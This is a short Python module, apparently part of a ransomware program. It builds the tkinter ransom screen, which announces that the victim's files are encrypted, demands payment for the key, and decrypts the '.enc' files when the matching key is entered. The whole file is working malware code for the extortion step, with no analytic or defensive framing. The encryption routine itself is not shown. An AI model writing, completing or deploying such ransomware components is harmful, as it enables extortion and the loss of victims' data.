import tkinter as tk
from tkinter import messagebox, simpledialog
from decryption import decrypt_file

def launch_gui(encrypted_files, key):
    """Shows ransom GUI window with option to enter decryption key."""
    
    def try_decrypt():
        entered_key = simpledialog.askstring("Decrypt", "Enter your decryption key:")
        if entered_key and entered_key.encode() == key:
            for file_path in encrypted_files:
                decrypt_file(file_path + ".enc", key)
            messagebox.showinfo("Success", "Your files have been decrypted!")
            window.destroy()
        else:
            messagebox.showerror("Error", "Wrong key. Try again.")
    
    window = tk.Tk()
    window.title("Your files have been encrypted")
    window.geometry("400x200")
    
    label = tk.Label(window, text="Your files are encrypted.\nPay ransom to get the decryption key.", font=("Arial", 14))
    label.pack(pady=30)
    
    decrypt_button = tk.Button(window, text="Enter Decryption Key", command=try_decrypt, width=25, height=2)
    decrypt_button.pack()
    
    window.mainloop()
